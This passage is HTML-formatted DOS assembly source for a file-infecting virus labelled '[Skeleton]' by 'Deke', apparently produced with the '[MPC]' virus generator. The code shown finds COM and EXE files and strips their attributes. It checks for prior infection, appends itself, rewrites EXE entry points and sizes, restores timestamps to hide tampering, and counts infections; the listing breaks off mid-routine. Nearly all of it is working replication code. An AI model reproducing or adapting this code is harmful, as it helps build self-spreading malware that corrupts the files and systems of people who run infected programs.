<br><font color="#3333FF">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
call infect_mask</font>
<p><font color="#3333FF">done_infections:</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
mov&nbsp; ah,1ah&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
; restore DTA to default</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
mov&nbsp; dx,80h&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
; DTA in PSP</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
cmp&nbsp; sp,id-4&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
; EXE or COM?</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
jz&nbsp;&nbsp; returnEXE</font>
<br><font color="#3333FF">returnCOM:</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
int&nbsp; 21h</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
retn&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
; 100h is on stack</font>
<br><font color="#3333FF">returnEXE:</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
pop&nbsp; es</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
pop&nbsp; ds</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
int&nbsp; 21h</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
mov&nbsp; ax,es&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
; AX = PSP segment</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
add&nbsp; ax,10h&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
; Adjust for PSP</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
add&nbsp; word ptr cs:[bp+oldCSIP+2],ax</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
add&nbsp; ax,word ptr cs:[bp+oldSSSP+2]</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
cli&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
; Clear intrpts for stack manipulation</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
mov&nbsp; sp,word ptr cs:[bp+oldSSSP]</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
mov&nbsp; ss,ax</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
sti</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
db&nbsp;&nbsp; 0eah&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
; jmp ssss:oooo</font>
<br><font color="#3333FF">oldCSIP&nbsp;&nbsp; db ?&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
; Original CS:IP (4 bytes)</font>
<br><font color="#3333FF">save3&nbsp;&nbsp;&nbsp;&nbsp; db 0cdh,20h,0&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
; First 3 bytes of COM file</font>
<br><font color="#3333FF">oldSSSP&nbsp;&nbsp; dd ?&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
; Original SS:SP</font>
<br><font color="#3333FF">oldCSIP2&nbsp; dd ?</font>
<br><font color="#3333FF">oldSSSP2&nbsp; dd ?</font>
<p><font color="#3333FF">creator&nbsp;&nbsp; db '[MPC]',0&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
; Mass Produced Code Generator</font>
<br><font color="#3333FF">virus&nbsp;&nbsp;&nbsp;&nbsp; db '[Skeleton]',0</font>
<br><font color="#3333FF">author&nbsp;&nbsp;&nbsp; db 'Deke',0</font>
<p><font color="#3333FF">infect_mask:</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
mov&nbsp; ah,4eh&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
; find first file</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
mov&nbsp; cx,7&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
; any attribute</font>
<br><font color="#3333FF">findfirstnext:</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
int&nbsp; 21h&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
; DS:DX points to mask</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
jc&nbsp;&nbsp; exit_infect_mask&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
; No mo files found</font>
<p><font color="#3333FF">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
xor&nbsp; cx,cx&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
; Clear attributes</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
call attributes&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
; Set file attributes</font>
<p><font color="#3333FF">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
mov&nbsp; ax,3d02h&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
; Open read/write</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
int&nbsp; 21h</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
xchg ax,bx</font>
<p><font color="#3333FF">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
mov&nbsp; ah,3fh&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
; Read file to buffer</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
lea&nbsp; dx,[bp+offset buffer]&nbsp;&nbsp;&nbsp; ; @ DS:DX</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
mov&nbsp; cx,1Ah&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
; 1Ah bytes</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
int&nbsp; 21h</font>
<p><font color="#3333FF">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
mov&nbsp; ax,4202h&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
; Go to end of file</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
xor&nbsp; cx,cx</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
cwd</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
int&nbsp; 21h</font>
<p><font color="#3333FF">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
cmp&nbsp; word ptr [bp+buffer],'ZM'; EXE?</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
jz&nbsp;&nbsp; checkEXE&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
; Why yes, yes it is!</font>
<br><font color="#3333FF">checkCOM:</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
mov&nbsp; ax,word ptr [bp+newDTA+1Ah] ; Filesize in DTA</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
cmp&nbsp; ax,65535-(endheap-decrypt) ; Is it too large?</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
ja&nbsp;&nbsp; find_next</font>
<p><font color="#3333FF">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
mov&nbsp; cx,word ptr [bp+buffer+1]; get jmp location</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
add&nbsp; cx,heap-startvirus+3&nbsp;&nbsp;&nbsp;&nbsp; ; Adjust for virus
size</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
cmp&nbsp; ax,cx&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
; Already infected?</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
je&nbsp;&nbsp; find_next</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
jmp&nbsp; infect_com</font>
<br><font color="#3333FF">checkEXE:</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
cmp&nbsp; word ptr [bp+buffer+10h],id ; is it already infected?</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
jnz&nbsp; infect_exe</font>
<br><font color="#3333FF">done_file:</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
mov&nbsp; ax,5701h&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
; Restore creation date/time</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
mov&nbsp; cx,word ptr [bp+newDTA+16h] ; time</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
mov&nbsp; dx,word ptr [bp+newDTA+18h] ; date</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
int&nbsp; 21h</font>
<p><font color="#3333FF">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
mov&nbsp; ah,3eh&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
; Close file</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
int&nbsp; 21h</font>
<p><font color="#3333FF">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
mov&nbsp; ch,0</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
mov&nbsp; cl,byte ptr [bp+newDTA+15h] ; Restore original</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
call attributes&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
; attributes</font>
<p><font color="#3333FF">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
cmp&nbsp; byte ptr [bp+numinfec], 0; Enough infections?</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
jnz&nbsp; find_next</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
pop&nbsp; ax&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
; remove call from stack</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
jmp&nbsp; done_infections</font>
<p><font color="#3333FF">find_next:</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
mov&nbsp; ah,4fh&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
; find next file</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
jmp&nbsp; short findfirstnext</font>
<br><font color="#3333FF">exit_infect_mask: ret</font>
<p><font color="#3333FF">infect_exe:</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
mov&nbsp; cx, 1ah</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
push cx</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
push bx&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
; Save file handle</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
les&nbsp; ax,dword ptr [bp+buffer+14h] ; Save old entry point</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
mov&nbsp; word ptr [bp+oldCSIP2], ax</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
mov&nbsp; word ptr [bp+oldCSIP2+2], es</font>
<p><font color="#3333FF">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
les&nbsp; ax,dword ptr [bp+buffer+0Eh] ; Save old stack</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
mov&nbsp; word ptr [bp+oldSSSP2],es</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
mov&nbsp; word ptr [bp+oldSSSP2+2],ax</font>
<p><font color="#3333FF">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
mov&nbsp; ax,word ptr [bp+buffer+8]; Get header size</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
mov&nbsp; cl, 4&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
; convert to bytes</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
shl&nbsp; ax, cl</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
xchg ax, bx</font>
<p><font color="#3333FF">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
les&nbsp; ax,dword ptr [bp+newDTA+26] ; Get file size</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
mov&nbsp; dx, es&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
; to DX:AX</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
push ax</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
push dx</font>
<p><font color="#3333FF">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
sub&nbsp; ax, bx&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
; Subtract header size from</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
sbb&nbsp; dx, 0&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
; file size</font>
<p><font color="#3333FF">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
mov&nbsp; cx, 10h&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
; Convert to segment:offset</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
div&nbsp; cx&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
; form</font>
<p><font color="#3333FF">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
mov&nbsp; word ptr [bp+buffer+14h], dx ; New entry point</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
mov&nbsp; word ptr [bp+buffer+16h], ax</font>
<p><font color="#3333FF">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
mov&nbsp; word ptr [bp+buffer+0Eh], ax ; and stack</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
mov&nbsp; word ptr [bp+buffer+10h], id</font>
<p><font color="#3333FF">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
pop&nbsp; dx&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
; get file length</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
pop&nbsp; ax</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
pop&nbsp; bx&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
; Restore file handle</font>
<p><font color="#3333FF">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
add&nbsp; ax, heap-startvirus&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ; add virus
size</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
adc&nbsp; dx, 0</font>
<p><font color="#3333FF">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
mov&nbsp; cl, 9</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
push ax</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
shr&nbsp; ax, cl</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
ror&nbsp; dx, cl</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
stc</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
adc&nbsp; dx, ax</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
pop&nbsp; ax</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
and&nbsp; ah, 1&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
; mod 512</font>
<p><font color="#3333FF">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
mov&nbsp; word ptr [bp+buffer+4], dx ; new file size</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
mov&nbsp; word ptr [bp+buffer+2], ax</font>
<p><font color="#3333FF">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
push cs&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
; restore ES</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
pop&nbsp; es</font>
<p><font color="#3333FF">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
mov&nbsp; ax,word ptr [bp+buffer+14h] ; needed later</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
jmp&nbsp; short finishinfection</font>
